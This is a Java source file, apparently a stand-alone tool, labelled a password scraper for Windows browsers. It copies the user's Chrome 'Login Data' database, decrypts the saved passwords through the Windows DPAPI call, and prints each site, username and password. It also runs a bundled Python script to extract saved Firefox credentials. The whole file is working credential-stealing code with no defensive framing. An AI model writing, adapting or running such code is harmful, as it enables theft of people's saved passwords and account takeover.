// Password Scraper for Chrome/Firefox/IE for Windows
import java.util.*;

// Apache Libs
import org.apache.commons.io.FileUtils;

// WIN32 Native Functions
import com.sun.jna.platform.win32.*;

import java.io.BufferedReader;
// Standard Java IO
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;

// SQLite libraries
import java.sql.DriverManager;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import org.json.simple.parser.ParseException;

// Java Sec Suite
import java.security.*;

public class JDec extends Crypt32Util {
	
	public ArrayList<Credentials> ChromeDec() throws IOException, SQLException {
		
		// Final Credentials
		ArrayList<Credentials> ChromeDetails = new ArrayList<Credentials>();
		System.out.println("--- GOOGLE-CHROME CREDENTIALS ---\n");
		
		// Redirect output to text file
		/*
		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
		System.setOut(out);*/
		
		// Get username
		String user = System.getProperty("user.name");

		File chrome = FileUtils.getFile("C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
		File chromedest = FileUtils.getFile("logindata.db");
		FileUtils.copyFile(chrome, chromedest);
	
		Connection conn = null;

		// Use arguments string for db url
		String url = "jdbc:sqlite:logindata.db";
		conn = DriverManager.getConnection(url);

		// SQL Queries
		Statement stmt1 = conn.createStatement();
		Statement stmt2 = conn.createStatement();
		Statement stmt3 = conn.createStatement();
		Statement stmt4 = conn.createStatement();
		String sqlurls = "SELECT origin_url FROM logins ";
		String sqlusernames = "SELECT username_value FROM logins ORDER BY username_value";
		String sqlpassblobs = "SELECT password_value FROM logins ORDER BY username_value";
		String count = "SELECT COUNT(username_value) FROM logins";
		ResultSet dbcount = stmt4.executeQuery(count);
		int cint = dbcount.getInt(1);
	
		ArrayList<byte[]> bytearray = new ArrayList<byte[]>();
	
		ResultSet rsurls = stmt1.executeQuery(sqlurls);
		ResultSet rsusernames = stmt2.executeQuery(sqlusernames);
		ResultSet rspassblobs = stmt3.executeQuery(sqlpassblobs);
	
		// URLs into String array
		int urint = 0;
		String[] urls = new String[cint];
		while(urint!=cint){
		urls[urint] = rsurls.getString(1);
		rsurls.next();
		urint++;
		}
	
		// Usernames into String array
		int unint = 0;
		String[] usernames = new String[cint];
		while(unint!=cint) {
		usernames[unint] = rsusernames.getString(1);
		rsusernames.next();
		unint++;
		}
	
		int pint = 0;
		// Putting BLOBs into byte array
		while(pint!=cint) {
		bytearray.add(rspassblobs.getBytes(1));
		rspassblobs.next();
		pint++;
		}
	
		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
		int x = 0;
	
		// Decrypt data
		while(x != cint) {
		unencrypted.add(cryptUnprotectData(bytearray.get(x), 0));
		x++;
		}
	
		// Put decrypted passwords into string array
		String[] passwords = new String[cint];
		for(int y = 0; y < cint; y++) {
		passwords[y] = new String(unencrypted.get(y), "UTF-8");
		}
		
		for(int i = 0; i < cint; i++){ ChromeDetails.add(new Credentials(urls[i], usernames[i], passwords[i])); }
		
		// Print results
		for(int i = 0; i < cint; i++) {
		System.out.println("URL: " + urls[i] + " -- Username: " + usernames[i] + " -- Password: " + passwords[i]);
		}
		
		return ChromeDetails;
	}
	
	public ArrayList<Credentials> FirefoxDec() throws IOException, ParseException, GeneralSecurityException {
		
		// Redirect output to text file
		/*
		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
		System.setOut(out);
		
		System.out.println();
		System.out.println("Firefox usernames and passwords: ");
		*/
		
		ArrayList<Credentials> firefoxcreds = new ArrayList<Credentials>();
		
		// Execute Python
		try{
		ProcessBuilder pb = new ProcessBuilder(System.getProperty("user.dir").toString() + "\\Python27\\python", "firefox_decrypt.py", "-n");
		pb.directory(new File(System.getProperty("user.dir") + "\\Python27\\"));
		Process p = pb.start();
		
		BufferedReader output = getOutput(p);
		BufferedReader error = getError(p);
		String line = "";
		
		ArrayList<String> arrayout = new ArrayList<String>();
		
		// Take Firefox Script output and put Credentials into Java ArrayList
		
		System.out.println("--- FIREFOX CREDENTIALS ---\n");
		
		while ((line = output.readLine()) != null) {	
			
		    if(!line.matches("") && line.contains("Website:") && line.toString() != null){
		    System.out.println(line);
		    arrayout.add(line.substring(line.indexOf("http"), line.lastIndexOf("")));
		    }
		    
		    if((!line.matches("") && line.contains("Username:") && line.toString() != null) 
		    	|| 
		    		(!line.matches("") && line.contains("Password:") && line.toString() != null)){
		    System.out.println(line);
		    arrayout.add(line.substring(line.indexOf("'"), line.lastIndexOf("")));
		    }
		}
		
		for(int x = 0; x < arrayout.size(); x = x + 3){
		Credentials temp = new Credentials(arrayout.get(x), arrayout.get(x+1), arrayout.get(x+2));
		firefoxcreds.add(temp);
		}

		while ((line = error.readLine()) != null) {
		 System.out.println(line);
		}
		
		p.waitFor();
		
		} catch(Exception e){ System.out.println(e); }
		
		return firefoxcreds;
		
	}
	
	private static BufferedReader getOutput(Process p) {
	    return new BufferedReader(new InputStreamReader(p.getInputStream()));
	}

	private static BufferedReader getError(Process p) {
	    return new BufferedReader(new InputStreamReader(p.getErrorStream()));
	}
	
}